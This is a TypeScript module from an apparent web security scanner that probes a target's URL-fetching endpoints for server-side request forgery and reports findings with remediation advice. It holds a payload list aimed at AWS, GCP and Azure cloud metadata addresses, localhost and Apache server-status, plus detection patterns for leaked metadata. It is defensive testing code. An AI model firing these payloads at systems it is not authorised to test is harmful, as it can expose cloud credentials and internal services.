import type { ScanModule, Finding } from "../types";
import { scanFetch } from "../fetch";
import { looksLikeHtml } from "../soft404";

const SSRF_PARAMS = [
  "url", "uri", "link", "src", "source", "href", "path", "file",
  "page", "site", "feed", "host", "redirect", "proxy", "fetch",
  "load", "target", "image", "imageUrl", "image_url", "img",
  "picture", "pic", "icon", "avatar", "callback", "webhook",
];

const SSRF_PAYLOADS = [
  { payload: "http://169.254.169.254/latest/meta-data/", name: "AWS metadata" },
  { payload: "http://metadata.google.internal/computeMetadata/v1/", name: "GCP metadata" },
  { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", name: "Azure metadata" },
  { payload: "http://127.0.0.1:3000/", name: "localhost" },
  { payload: "http://[::1]:3000/", name: "IPv6 localhost" },
  { payload: "http://0.0.0.0/", name: "zero address" },
  { payload: "http://localhost/server-status", name: "Apache server-status" },
];

export const ssrfModule: ScanModule = async (target) => {
  const findings: Finding[] = [];
  const allJs = Array.from(target.jsContents.values()).join("\n");

  // Find URL-fetching endpoints from JS bundles
  const fetchEndpoints = new Set<string>();

  // Look for endpoints that accept URL parameters
  const urlPatterns = [
    /["'`](\/api\/[a-zA-Z0-9/_-]*(?:proxy|fetch|scrape|preview|embed|og|meta|image|screenshot|pdf|render|import|webhook|callback)[a-zA-Z0-9/_-]*)["'`]/gi,
  ];
  for (const pat of urlPatterns) {
    for (const m of allJs.matchAll(pat)) {
      if (m[1]) fetchEndpoints.add(target.baseUrl + m[1]);
    }
  }

  // Also check discovered API endpoints
  for (const ep of target.apiEndpoints) {
    if (/proxy|fetch|scrape|preview|embed|og|meta|screenshot|pdf|render|import|url|image|webhook|callback/i.test(ep)) {
      fetchEndpoints.add(ep);
    }
  }

  if (fetchEndpoints.size === 0) return findings;

  const MAX_FINDINGS = 3;
  const testedEndpoints = [...fetchEndpoints].slice(0, 10);

  let ssrfCount = 0;

  for (const endpoint of testedEndpoints) {
    if (findings.length >= MAX_FINDINGS) break;

    // Test GET: parallelize all param+payload combinations for this endpoint
    const getTests = SSRF_PARAMS.slice(0, 8).flatMap((param) =>
      SSRF_PAYLOADS.slice(0, 3).map(({ payload, name }) => ({ param, payload, name })),
    );

    const getResults = await Promise.allSettled(
      getTests.map(async ({ param, payload, name }) => {
        const testUrl = new URL(endpoint);
        testUrl.searchParams.set(param, payload);
        const res = await scanFetch(testUrl.href, { timeoutMs: 5000 });
        const text = await res.text();
        return { param, payload, name, testUrl, res, text };
      }),
    );

    for (const result of getResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (result.status !== "fulfilled") continue;
      const { param, name, testUrl, res, text } = result.value;
      if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, name)) {
        findings.push({
          id: `ssrf-get-${ssrfCount++}`,
          module: "SSRF",
          severity: "critical",
          title: `SSRF: ${name} accessible via ${param} parameter on ${new URL(endpoint).pathname}`,
          description: `The endpoint fetches user-supplied URLs server-side without validating the target. An attacker can access internal services, cloud metadata, and private networks.`,
          evidence: `GET ${testUrl.href}\nStatus: ${res.status}\nResponse preview: ${text.substring(0, 200)}`,
          remediation: "Validate and sanitize URLs before fetching. Block requests to internal IP ranges (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Use an allowlist of permitted domains.",
          cwe: "CWE-918",
          owasp: "A10:2021",
        });
      }
    }

    // Test POST with URL in body — parallelize payloads
    if (findings.length >= MAX_FINDINGS) break;
    const postResults = await Promise.allSettled(
      SSRF_PAYLOADS.slice(0, 3).map(async ({ payload, name }) => {
        const res = await scanFetch(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: payload, uri: payload, source: payload }),
          timeoutMs: 5000,
        });
        const text = await res.text();
        return { payload, name, res, text };
      }),
    );

    for (const result of postResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (result.status !== "fulfilled") continue;
      const { payload, name, res, text } = result.value;
      if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, name)) {
        findings.push({
          id: `ssrf-post-${ssrfCount++}`,
          module: "SSRF",
          severity: "critical",
          title: `SSRF: ${name} accessible via POST body on ${new URL(endpoint).pathname}`,
          description: `The endpoint fetches user-supplied URLs from POST body without validation. An attacker can access internal services and cloud metadata.`,
          evidence: `POST ${endpoint} with url: ${payload}\nStatus: ${res.status}\nResponse preview: ${text.substring(0, 200)}`,
          remediation: "Validate and sanitize URLs before fetching. Block internal IP ranges. Use domain allowlists.",
          cwe: "CWE-918",
          owasp: "A10:2021",
        });
      }
    }
  }

  return findings;
};

const isSSRFIndicator = (text: string, payloadName: string): boolean => {
  if (payloadName === "AWS metadata") {
    return /ami-id|instance-id|instance-type|local-hostname|public-hostname|security-credentials/i.test(text);
  }
  if (payloadName === "GCP metadata") {
    return /project-id|zone|machine-type|service-accounts/i.test(text);
  }
  if (payloadName === "Azure metadata") {
    return /vmId|subscriptionId|resourceGroupName|vmSize/i.test(text);
  }
  if (payloadName === "Apache server-status") {
    return /Apache Server Status|scoreboard/i.test(text);
  }
  // For localhost/zero-address: require strong evidence of actual internal service content
  if (/localhost|zero address|IPv6/.test(payloadName)) {
    if (text.includes("ECONNREFUSED") || text.includes("fetch failed") || text.length < 50) return false;
    // Reject error messages that merely mention localhost/127.0.0.1
    if (/cannot|couldn't|unable|failed|refused|error|timeout|unreachable/i.test(text.substring(0, 200))) return false;
    // Must contain structural indicators of an internal service response (HTML page or JSON data)
    const hasStructure = (text.includes("<title>") && text.includes("</title>")) ||
      (text.startsWith("{") && text.length > 100) ||
      /server-status|phpinfo|admin|dashboard/i.test(text);
    return hasStructure;
  }
  return false;
};
